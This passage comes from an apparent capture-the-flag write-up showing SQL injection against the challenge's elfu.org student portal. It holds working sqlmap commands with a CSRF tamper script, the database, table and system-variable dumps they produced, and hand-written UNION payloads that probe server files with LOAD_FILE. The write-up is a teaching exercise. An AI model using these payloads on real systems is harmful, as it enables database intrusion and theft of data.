</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">Error: <span style="color:#ff79c6">SELECT</span> status <span style="color:#ff79c6">FROM</span> applications <span style="color:#ff79c6">WHERE</span> elfmail <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>a<span style="color:#ff79c6">@</span>a.com<span style="color:#f1fa8c">&#39;;
</span><span style="color:#f1fa8c">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;</span>a<span style="color:#ff79c6">@</span>a.com<span style="color:#f1fa8c">&#39;&#39;</span> <span style="color:#ff79c6">at</span> line <span style="color:#bd93f9">1</span>
</code></pre></td></tr></table>
</div>
</div><p>Definitely a SQLI vulnerability that should be exploitable.
Instead of using SQLMAP tool that automates the job, I want to try to break it manually.</p>
<p>First let&rsquo;s try to get the application status with a SQLI and without getting an error message with: <code>'a@a.com';</code>.
The web page has some javascript that check the format of my email address and prompt us <code>Please enter a valid email address</code>.</p>
<p>We can use burp-suite to by-pass this control, but developer tools should be enough.
I find the javascript function <code>submitApplication()</code> which itself calls the function <code>elfsign()</code>
which sends an XmlHttpRequest with /validator.php &hellip;</p>
<p>it sounds like it provides a token that will be checked on server side.
This make our task a bit more complicated.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">    <span style="color:#ff79c6">&lt;</span>script<span style="color:#ff79c6">&gt;</span>

    <span style="color:#8be9fd;font-style:italic">function</span> submitApplication() {
      console.log(<span style="color:#f1fa8c">&#34;Submitting&#34;</span>);
      elfSign();
      <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;check&#34;</span>).submit();
    }
    <span style="color:#8be9fd;font-style:italic">function</span> elfSign() {
      <span style="color:#8be9fd;font-style:italic">var</span> s <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;token&#34;</span>);

      <span style="color:#ff79c6">const</span> Http <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> XMLHttpRequest();
      <span style="color:#ff79c6">const</span> url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;/validator.php&#39;</span>;
      Http.open(<span style="color:#f1fa8c">&#34;GET&#34;</span>, url, <span style="color:#ff79c6">false</span>);
      Http.send(<span style="color:#ff79c6">null</span>);

      <span style="color:#ff79c6">if</span> (Http.status <span style="color:#ff79c6">===</span> <span style="color:#bd93f9">200</span>) {
        console.log(Http.responseText);
        s.value <span style="color:#ff79c6">=</span> Http.responseText;
      }

    }

    <span style="color:#ff79c6">&lt;</span>/script&gt;
</code></pre></td></tr></table>
</div>
</div><p>I have created a simple python script <a href="./sqli.py">sqli.py</a> to perform a Blin Sql Injection &hellip;
but SqlMap is so much more efficient.</p>
<p>Let&rsquo;s enumerate the schemas:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs --dbs
available databases <span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span>:
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> elfu
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> information_schema
</code></pre></td></tr></table>
</div>
</div><p>Now let&rsquo;s enumerate the tables:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D elfu --tables
Database: elfu
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">3</span> tables<span style="color:#ff79c6">]</span>
+--------------+
| applications |
| krampus      |
| students     |
+--------------+
</code></pre></td></tr></table>
</div>
</div><p><strong>Krampus</strong> table sounds sweet and interesting. Now we can fetch the columns of those tables:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D elfu -T krampus,students --columns
Database: elfu
Table: krampus
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">2</span> columns<span style="color:#ff79c6">]</span>
+--------+-------------+
| Column | Type        |
+--------+-------------+
| path   | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span> |
| id     | int<span style="color:#ff79c6">(</span>11<span style="color:#ff79c6">)</span>     |
+--------+-------------+

Database: elfu
Table: students
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">5</span> columns<span style="color:#ff79c6">]</span>
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| bio            | varchar<span style="color:#ff79c6">(</span>300<span style="color:#ff79c6">)</span> |
| degree         | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span>  |
| id             | int<span style="color:#ff79c6">(</span>11<span style="color:#ff79c6">)</span>      |
| name           | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span>  |
| student_number | varchar<span style="color:#ff79c6">(</span>30<span style="color:#ff79c6">)</span>  |
+----------------+--------------+
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s dump krampus table:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D elfu -T krampus --dump
tabase: elfu
Table: krampus
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">6</span> entries<span style="color:#ff79c6">]</span>
+----+-----------------------+
| id | path                  |
+----+-----------------------+
| <span style="color:#bd93f9">1</span>  | /krampus/0f5f510e.png |
| <span style="color:#bd93f9">2</span>  | /krampus/1cc7e121.png |
| <span style="color:#bd93f9">3</span>  | /krampus/439f15e6.png |
| <span style="color:#bd93f9">4</span>  | /krampus/667d6896.png |
| <span style="color:#bd93f9">5</span>  | /krampus/adb798ca.png |
| <span style="color:#bd93f9">6</span>  | /krampus/ba417715.png |
+----+-----------------------+
</code></pre></td></tr></table>
</div>
</div><p>We attempt to identify the existence of those files in the filesystem.
The below command should return &lsquo;success&rsquo; when the file exists, otherwise &lsquo;no application&rsquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqli.py --payload <span style="color:#f1fa8c">&#34;iuiwug&#39; UNION select &#39;completeddfgsfhf&#39; from krampus where LOAD_FILE(&#39;/krampus/0f5f510e.png&#39;) is NOT NULL  %23&#34;</span>  | egrep <span style="color:#f1fa8c">&#34;success|no application&#34;</span>
no application
</code></pre></td></tr></table>
</div>
</div><p>We try the above command for all files but none of them exists in the file system.
Maybe we should look for an exploit or for some system variable limitations?</p>
<p>Let&rsquo;s fetch the MySQL version</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqli.py --payload <span style="color:#f1fa8c">&#34;iuiwug&#39; UNION select v from (select VERSION() as v) toto WHERE v like &#39;{1}%25&#39;  %23&#34;</span> --dump any
<span style="color:#f1fa8c">&#39;10.1.43-mariadb-1_bionic&#39;</span>

python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D information_schema -T system_variables -C VARIABLE_NAME,GLOBAL_VALUE,SESSION_VALUE --dump  --threads<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span> --where <span style="color:#f1fa8c">&#34;VARIABLE_NAME LIKE &#39;%version%&#39;&#34;</span>
Database: information_schema
Table: system_variables
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">10</span> entries<span style="color:#ff79c6">]</span>
+-------------------------+---------------------------------+---------------+
| VARIABLE_NAME           | GLOBAL_VALUE                    | SESSION_VALUE |
+-------------------------+---------------------------------+---------------+
| SLAVE_TYPE_CONVERSIONS  | &lt;blank&gt;                         | NULL          |
| PROTOCOL_VERSION        | <span style="color:#bd93f9">10</span>                              | NULL          |
| VERSION                 | 10.1.43-MariaDB-1~bionic        | NULL          |
| INNODB_VERSION          | 5.6.45-86.1                     | NULL          |
| VERSION_COMPILE_OS      | debian-linux-gnu                | NULL          |
| VERSION_COMMENT         | mariadb.org binary distribution | NULL          |
| VERSION_SSL_LIBRARY     | OpenSSL 1.0.2n  <span style="color:#bd93f9">7</span> Dec <span style="color:#bd93f9">2017</span>      | NULL          |
| VERSION_MALLOC_LIBRARY  | system jemalloc                 | NULL          |
| WSREP_PATCH_VERSION     | wsrep_25.24                     | NULL          |
| VERSION_COMPILE_MACHINE | x86_64                          | NULL          |
+-------------------------+---------------------------------+---------------+
</code></pre></td></tr></table>
</div>
</div><p>No exploit available on exploit-db for this version, no CVE vulnerabilities either :(</p>
<p>Any chance download is disabled? Let&rsquo;s see &hellip;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D information_schema -T system_variables -C VARIABLE_NAME,GLOBAL_VALUE,SESSION_VALUE --dump  --threads<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span> --where <span style="color:#f1fa8c">&#34;VARIABLE_NAME LIKE &#39;%secure_file_priv%&#39;&#34;</span>
+------------------+--------------+---------------+
| VARIABLE_NAME    | GLOBAL_VALUE | SESSION_VALUE |
+------------------+--------------+---------------+
| SECURE_FILE_PRIV | &lt;blank&gt;      | NULL          |
+------------------+--------------+---------------+
</code></pre></td></tr></table>
</div>
</div><p>Nope &hellip; IS it because the files are too big, What&rsquo;s the maximum size?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python sqlmap.py -u https://studentportal.elfu.org/application-check.php?elfmail<span style="color:#ff79c6">=</span>q -p elfmail --tamper<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;csrf_proxy.py&#34;</span> --regex<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Congratulations|still pending&#34;</span> --risk<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>  --skip-urlencode --technique<span style="color:#ff79c6">=</span>B --level<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span> --dbms<span style="color:#ff79c6">=</span>MySQL --exclude-sysdbs -D information_schema -T system_variables -C VARIABLE_NAME,GLOBAL_VALUE,SESSION_VALUE,DEFAULT_VALUE --dump  --threads<span style="color:#ff79c6">=</span><span style="color:#bd93f9">10</span> --where <span style="color:#f1fa8c">&#34;VARIABLE_NAME LIKE &#39;%max_allowed_packet%&#39;&#34;</span>
Database: information_schema
Table: system_variables
<span style="color:#ff79c6">[</span><span style="color:#bd93f9">2</span> entries<span style="color:#ff79c6">]</span>
+--------------------------+--------------+---------------+---------------+
| VARIABLE_NAME            | GLOBAL_VALUE | SESSION_VALUE | DEFAULT_VALUE |
+--------------------------+--------------+---------------+---------------+
| SLAVE_MAX_ALLOWED_PACKET | <span style="color:#bd93f9">1073741824</span>   | NULL          | <span style="color:#bd93f9">1073741824</span>    |
| MAX_ALLOWED_PACKET       | <span style="color:#bd93f9">16777216</span>     | <span style="color:#bd93f9">16777216</span>      | <span style="color:#bd93f9">4194304</span>       |
+--------------------------+--------------+---------------+---------------+
</code></pre></td></tr></table>
</div>
</div><p>16777216 wich I believe represents 16MB maximum to load a file,
so it should be more then enough to download the files unless I am not looking in the right location?</p>
<p>Why not looking in the web portal instead?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
